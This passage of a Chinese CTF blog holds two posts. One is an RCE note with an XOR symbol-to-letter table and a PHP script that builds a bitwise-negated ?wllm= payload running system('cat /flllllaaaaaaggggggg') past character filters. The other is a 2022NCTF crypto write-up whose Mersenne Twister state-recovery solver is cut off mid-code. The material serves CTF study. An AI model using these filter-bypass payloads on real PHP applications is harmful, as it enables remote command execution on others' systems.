^ @ = h <span class="number">104</span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="meta">@ ^ </span>) = i <span class="number">105</span></span></span></span><br><span class="line"><span class="params"><span class="meta"></span>) ^ @ = i <span class="number">105</span></span></span><br><span class="line"><span class="meta">@ ^ * = j <span class="number">106</span></span></span><br><span class="line">* ^ @ = j <span class="number">106</span></span><br><span class="line"><span class="meta">@ ^ + = k <span class="number">107</span></span></span><br><span class="line">+ ^ @ = k <span class="number">107</span></span><br><span class="line"><span class="meta">@ ^ , = l <span class="number">108</span></span></span><br><span class="line">, ^ @ = l <span class="number">108</span></span><br><span class="line">- ^ @ = m <span class="number">109</span></span><br><span class="line"><span class="meta">@ ^ - = m <span class="number">109</span></span></span><br><span class="line"><span class="meta">@ ^ . = n <span class="number">110</span></span></span><br><span class="line">. ^ @ = n <span class="number">110</span></span><br><span class="line"><span class="meta">@ ^ / = o <span class="number">111</span></span></span><br><span class="line">/ ^ @ = o <span class="number">111</span></span><br><span class="line">- ^ ] = p <span class="number">112</span></span><br><span class="line">^ ^ . = p <span class="number">112</span></span><br><span class="line">_ ^ / = p <span class="number">112</span></span><br><span class="line">+ ^ [ = p <span class="number">112</span></span><br><span class="line">/ ^ _ = p <span class="number">112</span></span><br><span class="line">. ^ ^ = p <span class="number">112</span></span><br><span class="line">[ ^ + = p <span class="number">112</span></span><br><span class="line">] ^ - = p <span class="number">112</span></span><br><span class="line">^ ^ / = q <span class="number">113</span></span><br><span class="line">* ^ [ = q <span class="number">113</span></span><br><span class="line">_ ^ . = q <span class="number">113</span></span><br><span class="line">/ ^ ^ = q <span class="number">113</span></span><br><span class="line">. ^ _ = q <span class="number">113</span></span><br><span class="line">, ^ ] = q <span class="number">113</span></span><br><span class="line">[ ^ * = q <span class="number">113</span></span><br><span class="line">] ^ , = q <span class="number">113</span></span><br><span class="line">- ^ _ = r <span class="number">114</span></span><br><span class="line">^ ^ , = r <span class="number">114</span></span><br><span class="line">_ ^ - = r <span class="number">114</span></span><br><span class="line">/ ^ ] = r <span class="number">114</span></span><br><span class="line">, ^ ^ = r <span class="number">114</span></span><br><span class="line">[ ^ ) = r <span class="number">114</span></span><br><span class="line">] ^ / = r <span class="number">114</span></span><br><span class="line">) ^ [ = r <span class="number">114</span></span><br><span class="line">- ^ ^ = s <span class="number">115</span></span><br><span class="line">^ ^ - = s <span class="number">115</span></span><br><span class="line">_ ^ , = s <span class="number">115</span></span><br><span class="line">. ^ ] = s <span class="number">115</span></span><br><span class="line">, ^ _ = s <span class="number">115</span></span><br><span class="line">[ ^ ( = s <span class="number">115</span></span><br><span class="line">] ^ . = s <span class="number">115</span></span><br><span class="line">( ^ [ = s <span class="number">115</span></span><br><span class="line">^ ^ * = t <span class="number">116</span></span><br><span class="line">* ^ ^ = t <span class="number">116</span></span><br><span class="line">_ ^ + = t <span class="number">116</span></span><br><span class="line">+ ^ _ = t <span class="number">116</span></span><br><span class="line">/ ^ [ = t <span class="number">116</span></span><br><span class="line">[ ^ / = t <span class="number">116</span></span><br><span class="line">] ^ ) = t <span class="number">116</span></span><br><span class="line">) ^ ] = t <span class="number">116</span></span><br><span class="line">^ ^ + = u <span class="number">117</span></span><br><span class="line">* ^ _ = u <span class="number">117</span></span><br><span class="line">_ ^ * = u <span class="number">117</span></span><br><span class="line">+ ^ ^ = u <span class="number">117</span></span><br><span class="line">. ^ [ = u <span class="number">117</span></span><br><span class="line">[ ^ . = u <span class="number">117</span></span><br><span class="line">] ^ ( = u <span class="number">117</span></span><br><span class="line">( ^ ] = u <span class="number">117</span></span><br><span class="line">- ^ [ = v <span class="number">118</span></span><br><span class="line">^ ^ ( = v <span class="number">118</span></span><br><span class="line">_ ^ ) = v <span class="number">118</span></span><br><span class="line">+ ^ ] = v <span class="number">118</span></span><br><span class="line">[ ^ - = v <span class="number">118</span></span><br><span class="line">] ^ + = v <span class="number">118</span></span><br><span class="line">( ^ ^ = v <span class="number">118</span></span><br><span class="line">) ^ _ = v <span class="number">118</span></span><br><span class="line">^ ^ ) = w <span class="number">119</span></span><br><span class="line">* ^ ] = w <span class="number">119</span></span><br><span class="line">_ ^ ( = w <span class="number">119</span></span><br><span class="line">, ^ [ = w <span class="number">119</span></span><br><span class="line">[ ^ , = w <span class="number">119</span></span><br><span class="line">] ^ * = w <span class="number">119</span></span><br><span class="line">( ^ _ = w <span class="number">119</span></span><br><span class="line">) ^ ^ = w <span class="number">119</span></span><br><span class="line"><span class="comment"># ^ [ = x 120</span></span><br><span class="line">% ^ ] = x <span class="number">120</span></span><br><span class="line">^ ^ &amp; = x <span class="number">120</span></span><br><span class="line">&amp; ^ ^ = x <span class="number">120</span></span><br><span class="line">[ ^ <span class="comment"># = x 120</span></span><br><span class="line">] ^ % = x <span class="number">120</span></span><br><span class="line">$ ^ ] = y <span class="number">121</span></span><br><span class="line">&amp; ^ _ = y <span class="number">121</span></span><br><span class="line">_ ^ &amp; = y <span class="number">121</span></span><br><span class="line">] ^ $ = y <span class="number">121</span></span><br><span class="line">$ ^ ^ = z <span class="number">122</span></span><br><span class="line">% ^ _ = z <span class="number">122</span></span><br><span class="line">^ ^ $ = z <span class="number">122</span></span><br><span class="line">_ ^ % = z <span class="number">122</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">^ ^ ? = a <span class="number">97</span></span><br><span class="line">_ ^ &gt; = a <span class="number">97</span></span><br><span class="line">? ^ ^ = a <span class="number">97</span></span><br><span class="line">&lt; ^ ] = a <span class="number">97</span></span><br><span class="line">&gt; ^ _ = a <span class="number">97</span></span><br><span class="line">] ^ &lt; = a <span class="number">97</span></span><br><span class="line">^ ^ &lt; = b <span class="number">98</span></span><br><span class="line">? ^ ] = b <span class="number">98</span></span><br><span class="line">&lt; ^ ^ = b <span class="number">98</span></span><br><span class="line">] ^ ? = b <span class="number">98</span></span><br><span class="line"><span class="meta">@ ^ </span><span class="comment"># = c 99</span></span><br><span class="line"><span class="comment"># ^ @ = c 99</span></span><br><span class="line">_ ^ &lt; = c <span class="number">99</span></span><br><span class="line">&lt; ^ _ = c <span class="number">99</span></span><br><span class="line">&gt; ^ ] = c <span class="number">99</span></span><br><span class="line">] ^ &gt; = c <span class="number">99</span></span><br><span class="line"><span class="meta">@ ^ $ = d <span class="number">100</span></span></span><br><span class="line">$ ^ @ = d <span class="number">100</span></span><br><span class="line">? ^ [ = d <span class="number">100</span></span><br><span class="line">[ ^ ? = d <span class="number">100</span></span><br><span class="line"><span class="meta">@ ^ % = e <span class="number">101</span></span></span><br><span class="line">% ^ @ = e <span class="number">101</span></span><br><span class="line">&gt; ^ [ = e <span class="number">101</span></span><br><span class="line">[ ^ &gt; = e <span class="number">101</span></span><br><span class="line"><span class="meta">@ ^ &amp; = f <span class="number">102</span></span></span><br><span class="line">&amp; ^ @ = f <span class="number">102</span></span><br><span class="line">&lt; ^ [ = g <span class="number">103</span></span><br><span class="line">[ ^ &lt; = g <span class="number">103</span></span><br><span class="line"><span class="meta">@ ^ (<span class="params"> = h <span class="number">104</span></span></span></span><br><span class="line"><span class="params"><span class="meta">(<span class="params"> ^ @ = h <span class="number">104</span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="meta">@ ^ </span>) = i <span class="number">105</span></span></span></span><br><span class="line"><span class="params"><span class="meta"></span>) ^ @ = i <span class="number">105</span></span></span><br><span class="line"><span class="meta">@ ^ * = j <span class="number">106</span></span></span><br><span class="line">* ^ @ = j <span class="number">106</span></span><br><span class="line"><span class="meta">@ ^ + = k <span class="number">107</span></span></span><br><span class="line">+ ^ @ = k <span class="number">107</span></span><br><span class="line"><span class="meta">@ ^ , = l <span class="number">108</span></span></span><br><span class="line">, ^ @ = l <span class="number">108</span></span><br><span class="line">- ^ @ = m <span class="number">109</span></span><br><span class="line"><span class="meta">@ ^ - = m <span class="number">109</span></span></span><br><span class="line"><span class="meta">@ ^ . = n <span class="number">110</span></span></span><br><span class="line">. ^ @ = n <span class="number">110</span></span><br><span class="line"><span class="meta">@ ^ / = o <span class="number">111</span></span></span><br><span class="line">/ ^ @ = o <span class="number">111</span></span><br><span class="line">- ^ ] = p <span class="number">112</span></span><br><span class="line">^ ^ . = p <span class="number">112</span></span><br><span class="line">_ ^ / = p <span class="number">112</span></span><br><span class="line">+ ^ [ = p <span class="number">112</span></span><br><span class="line">/ ^ _ = p <span class="number">112</span></span><br><span class="line">. ^ ^ = p <span class="number">112</span></span><br><span class="line">[ ^ + = p <span class="number">112</span></span><br><span class="line">] ^ - = p <span class="number">112</span></span><br><span class="line">^ ^ / = q <span class="number">113</span></span><br><span class="line">* ^ [ = q <span class="number">113</span></span><br><span class="line">_ ^ . = q <span class="number">113</span></span><br><span class="line">/ ^ ^ = q <span class="number">113</span></span><br><span class="line">. ^ _ = q <span class="number">113</span></span><br><span class="line">, ^ ] = q <span class="number">113</span></span><br><span class="line">[ ^ * = q <span class="number">113</span></span><br><span class="line">] ^ , = q <span class="number">113</span></span><br><span class="line">- ^ _ = r <span class="number">114</span></span><br><span class="line">^ ^ , = r <span class="number">114</span></span><br><span class="line">_ ^ - = r <span class="number">114</span></span><br><span class="line">/ ^ ] = r <span class="number">114</span></span><br><span class="line">, ^ ^ = r <span class="number">114</span></span><br><span class="line">[ ^ ) = r <span class="number">114</span></span><br><span class="line">] ^ / = r <span class="number">114</span></span><br><span class="line">) ^ [ = r <span class="number">114</span></span><br><span class="line">- ^ ^ = s <span class="number">115</span></span><br><span class="line">^ ^ - = s <span class="number">115</span></span><br><span class="line">_ ^ , = s <span class="number">115</span></span><br><span class="line">. ^ ] = s <span class="number">115</span></span><br><span class="line">, ^ _ = s <span class="number">115</span></span><br><span class="line">[ ^ ( = s <span class="number">115</span></span><br><span class="line">] ^ . = s <span class="number">115</span></span><br><span class="line">( ^ [ = s <span class="number">115</span></span><br><span class="line">^ ^ * = t <span class="number">116</span></span><br><span class="line">* ^ ^ = t <span class="number">116</span></span><br><span class="line">_ ^ + = t <span class="number">116</span></span><br><span class="line">+ ^ _ = t <span class="number">116</span></span><br><span class="line">/ ^ [ = t <span class="number">116</span></span><br><span class="line">[ ^ / = t <span class="number">116</span></span><br><span class="line">] ^ ) = t <span class="number">116</span></span><br><span class="line">) ^ ] = t <span class="number">116</span></span><br><span class="line">^ ^ + = u <span class="number">117</span></span><br><span class="line">* ^ _ = u <span class="number">117</span></span><br><span class="line">_ ^ * = u <span class="number">117</span></span><br><span class="line">+ ^ ^ = u <span class="number">117</span></span><br><span class="line">. ^ [ = u <span class="number">117</span></span><br><span class="line">[ ^ . = u <span class="number">117</span></span><br><span class="line">] ^ ( = u <span class="number">117</span></span><br><span class="line">( ^ ] = u <span class="number">117</span></span><br><span class="line">- ^ [ = v <span class="number">118</span></span><br><span class="line">^ ^ ( = v <span class="number">118</span></span><br><span class="line">_ ^ ) = v <span class="number">118</span></span><br><span class="line">+ ^ ] = v <span class="number">118</span></span><br><span class="line">[ ^ - = v <span class="number">118</span></span><br><span class="line">] ^ + = v <span class="number">118</span></span><br><span class="line">( ^ ^ = v <span class="number">118</span></span><br><span class="line">) ^ _ = v <span class="number">118</span></span><br><span class="line">^ ^ ) = w <span class="number">119</span></span><br><span class="line">* ^ ] = w <span class="number">119</span></span><br><span class="line">_ ^ ( = w <span class="number">119</span></span><br><span class="line">, ^ [ = w <span class="number">119</span></span><br><span class="line">[ ^ , = w <span class="number">119</span></span><br><span class="line">] ^ * = w <span class="number">119</span></span><br><span class="line">( ^ _ = w <span class="number">119</span></span><br><span class="line">) ^ ^ = w <span class="number">119</span></span><br><span class="line"><span class="comment"># ^ [ = x 120</span></span><br><span class="line">% ^ ] = x <span class="number">120</span></span><br><span class="line">^ ^ &amp; = x <span class="number">120</span></span><br><span class="line">&amp; ^ ^ = x <span class="number">120</span></span><br><span class="line">[ ^ <span class="comment"># = x 120</span></span><br><span class="line">] ^ % = x <span class="number">120</span></span><br><span class="line">$ ^ ] = y <span class="number">121</span></span><br><span class="line">&amp; ^ _ = y <span class="number">121</span></span><br><span class="line">_ ^ &amp; = y <span class="number">121</span></span><br><span class="line">] ^ $ = y <span class="number">121</span></span><br><span class="line">$ ^ ^ = z <span class="number">122</span></span><br><span class="line">% ^ _ = z <span class="number">122</span></span><br><span class="line">^ ^ $ = z <span class="number">122</span></span><br><span class="line">_ ^ % = z <span class="number">122</span></span><br></pre></td></tr></table></figure>

<p>例如  flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; ^ @ = f <span class="number">102</span></span><br><span class="line"><span class="meta">@ ^ , = l <span class="number">108</span></span></span><br><span class="line">^ ^ ? = a <span class="number">97</span></span><br><span class="line">&lt; ^ [ = g <span class="number">103</span></span><br><span class="line">flag = <span class="string">&#x27;&amp;@^&lt;&#x27;</span>^<span class="string">&#x27;@,?[&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-取反绕过"><a href="#2-取反绕过" class="headerlink" title="2.取反绕过"></a>2.取反绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EXP如下</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code1</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$code2</span>=<span class="string">&quot;cat /flllllaaaaaaggggggg&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?wllm=(~&quot;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$code1</span>).<span class="string">&quot;)(~&quot;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$code2</span>).<span class="string">&quot;);&quot;</span>;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2022NCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/14/2022NCTF/"
    >2022NCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/14/2022NCTF/" class="article-date">
  <time datetime="2023-03-14T14:04:55.000Z" itemprop="datePublished">2023-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="2022NCTF"><a href="#2022NCTF" class="headerlink" title="2022NCTF"></a>2022NCTF</h1><p>这次Crypto题目对于我来说过于困难，还好战队的佬写了wp</p>
<h2 id="Coloratura"><a href="#Coloratura" class="headerlink" title="Coloratura"></a>Coloratura</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/2023/03/14/2022NCTF/attach.png" alt="attach"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">width = <span class="number">208</span></span><br><span class="line">height = <span class="number">208</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeFlagImg</span>():</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    draw.text((<span class="number">5</span>, <span class="number">5</span>), flag, fill=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img1 = makeSourceImg()</span><br><span class="line">    img2 = makeFlagImg()</span><br><span class="line">    img3 = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = img1.getpixel((j, i)), img2.getpixel((j, i))</span><br><span class="line">            img3.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    img3.save(<span class="string">&#x27;attach.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_shift</span>(<span class="params">x, shift, <span class="built_in">type</span>, mask=<span class="number">0xffffffff</span>, nbit=<span class="number">32</span></span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nbit//shift):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;l&#x27;</span>: res = x ^ res &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;r&#x27;</span>: res = x ^ res &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_extract</span>(<span class="params">x</span>):</span><br><span class="line">    x = inverse_shift(x, <span class="number">18</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    x = inverse_shift(x, <span class="number">15</span>, <span class="string">&#x27;l&#x27;</span>, <span class="number">4022730752</span>)</span><br><span class="line">    x = inverse_shift(x,  <span class="number">7</span>, <span class="string">&#x27;l&#x27;</span>, <span class="number">2636928640</span>)</span><br><span class="line">    x = inverse_shift(x, <span class="number">11</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_twist</span>(<span class="params">cur</span>):</span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">x</span>):</span><br><span class="line">    y = x</span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">width = <span class="number">208</span></span><br><span class="line">height = <span class="number">208</span></span><br><span class="line">img3 = Image.<span class="built_in">open</span>(<span class="string">&#x27;attach.png&#x27;</span>)</span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        pix = img3.getpixel((j, i))</span><br><span class="line">        out += [pix[<span class="number">0</span>], pix[<span class="number">1</span>], pix[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">out = [<span class="built_in">hex</span>(_)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> out][::-<span class="number">1</span>]</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line">now_rand = [out[i: i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(out), <span class="number">8</span>)][::-<span class="number">1</span>]</span><br><span class="line">now_rand = [<span class="built_in">int</span>(_, <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> now_rand]</span><br><span class="line"></span><br><span class="line">state = [crack_extract(_) <span class="keyword">for</span> _ <span class="keyword">in</span> now_rand[-<span class="number">624</span>:]]</span><br><span class="line">ini_rand = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(ini_rand) &lt; <span class="built_in">len</span>(now_rand):</span><br><span class="line">    ini_rand = [extract(_) <span class="keyword">for</span> _ <span class="keyword">in</span> state] + ini_rand</span><br><span class="line">    state = crack_twist(state)</span><br><span class="line"></span><br><span class="line">ini_rand = [<span class="built_in">hex</span>(_)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> ini_rand][::-<span class="number">1</span>]</span><br><span class="line">ini_rand = <span class="string">&#x27;&#x27;</span>.join(ini_rand)</span><br><span class="line">ini = [ini_rand[i: i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, 